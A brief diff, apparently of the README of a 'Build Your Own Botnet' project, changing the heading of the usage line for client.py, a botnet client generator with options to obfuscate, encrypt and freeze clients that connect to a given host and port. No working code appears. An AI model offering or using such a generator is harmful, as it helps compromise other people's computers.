@@ -8,7 +8,7 @@
 
 Client Generator (Build Your Own Botnet)
 
-# usage: client.py 
+## usage: client.py 
                 [-h] [-v] [--name NAME] [--icon ICON] [--pastebin API]
                 [--encrypt] [--obfuscate] [--compress] [--freeze]
                 host port [module [module ...]]
